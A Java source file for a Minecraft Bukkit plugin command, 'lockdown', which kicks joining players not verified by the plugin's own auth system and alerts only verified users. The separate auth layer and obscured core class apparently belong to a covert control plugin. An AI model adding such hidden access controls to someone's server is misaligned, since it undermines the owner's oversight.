package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.io.IOException;

public class Lockdown implements Command, Listener {
    private Z_ _z;
    private boolean open = true;
    private String reason = "";

    @Override
    public String[] getCommands() {
        return new String[]{"lockdown"};
    }

    @Override
    public String getDescription() {
        return "Prevents all non-authed players from joining.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0 && !open) {
            open = true;
            sender.sendMessage(Colors.Prefix + Colors.Failure + "The server is no longer on lockdown!");
            return;
        }

        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "lockdown <reason...>");
            return;
        }

        reason = ChatColor.translateAlternateColorCodes('&', String.join(" ", args));
        reason = reason.replace("%ip", "%ip%");

        open = false;
        sender.sendMessage(Colors.Prefix + Colors.Success + "The server is now on lockdown for '" + reason + Colors.Success + "'!");
    }

    @Override
    public void onEnable(Z_ z) {
        this._z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void onJoin(PlayerJoinEvent e) throws IOException, InterruptedException {
        if (open || this._z.getAuth().isVerified(e.getPlayer().getName())) {
            return;
        }

        e.getPlayer().kickPlayer(reason);
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (this._z.getAuth().isVerified(p.getName())) {
                p.sendMessage(Colors.Prefix + Colors.Caution + e.getPlayer().getName() + " tried to join, kicked them for '" + reason + Colors.Success + "'. (Server is on lockdown)");
            }
        }
    }
}
